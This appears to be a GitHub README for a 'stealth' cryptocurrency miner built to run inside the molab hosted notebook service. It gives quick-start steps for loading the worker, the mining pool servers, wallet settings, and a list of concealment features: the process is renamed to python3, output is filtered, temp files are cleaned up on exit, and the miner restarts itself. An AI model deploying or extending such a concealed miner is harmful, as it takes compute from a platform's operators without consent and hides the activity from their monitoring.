# marimo-compute

Stealth Pearl (PRL) miner for [molab](https://molab.marimo.io/notebooks).

## Quick Start

[![Open in molab](https://molab.marimo.io/github/yooaru/marimo-compute/blob/main/compute_worker.py)](https://molab.marimo.io/github/yooaru/marimo-compute/blob/main/compute_worker.py)

Or manually:
1. Go to https://molab.marimo.io/notebooks
2. New notebook → From GitHub
3. Paste: `https://github.com/yooaru/marimo-compute/blob/main/compute_worker.py`

## Config

Edit the configuration cell:
- `POOL` — Pearl Fortune pool server
- `WALLET` — your `prl1...` address
- `WORKER_NAME` — node identifier

## Pool

| Server | Location |
|--------|----------|
| `global.pearlfortune.org:443` | Global (recommended) |
| `jp.pearlfortune.org:443` | Japan / East Asia |

## Stealth Features

- ✓ Process renamed to `python3`
- ✓ CPU nice +10
- ✓ Isolated temp directory
- ✓ Auto-cleanup on exit
- ✓ Filtered output (only hashrate/errors)
- ✓ Exponential backoff restart
- ✓ SHA256 checksum verification

## GPU Performance (Pearl Fortune)

| GPU | Hashrate | Power |
|-----|----------|-------|
| RTX Pro 6000 Blackwell | ~302 TH/s | 500W |
| A100-80GB | ~221 TH/s | 401W |
| RTX 4090 | ~265 TH/s | 449W |
| V100-32GB | ~48 TH/s | 275W |

## Miner

Uses [pearlfortune/pearl-miner](https://github.com/pearlfortune/pearl-miner) v1.1.4
